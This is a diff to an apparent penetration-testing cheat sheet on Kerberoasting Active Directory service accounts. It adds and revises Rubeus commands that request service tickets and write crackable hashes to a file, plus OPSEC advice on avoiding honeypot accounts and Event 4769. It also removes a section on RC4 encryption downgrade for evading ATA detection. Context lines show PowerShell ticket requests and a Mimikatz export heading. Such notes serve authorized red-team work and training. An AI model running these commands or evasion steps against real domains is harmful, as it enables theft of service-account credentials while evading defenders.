@@ -170,9 +170,11 @@ Rubeus.exe kerberoast /stats
 ```
 
 #### Reguest a TGS
+- OPSEC: Watch out for honeypot accounts, Generates Event 4769, Kerberoast specific users only!
 ```
-Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /domain <DOMAIN> /outfile:kerberoast_hashes.txt
-Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt
+./Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /outfile:kerberoast_hashes.txt
+
+./Rubeus.exe kerberoast /rc4opsec /user:<SERVICEACCOUNT> /domain:<DOMAIN> /outfile:kerberoast_hashes.txt
 ```
 
 ```
@@ -183,18 +185,6 @@ Invoke-Kerberoast -Outputformat hashcat
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>@<FQDN>"
-```
-
-```
-Request-SPNTicket "<SPN>"
-```
-
-#### Request TGS Avoid detection
-- Based on encryption downgrade for Kerberos Etype (used by likes ATA - 0x17 stands for rc4-hmac).
-- Look for kerberoastable accounts that only supports RC4_HMAC
-```
-Rubeus.exe kerberoast /stats /rc4opsec
-Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /rc4opsec
 ```
 
 #### Export ticket using Mimikatz
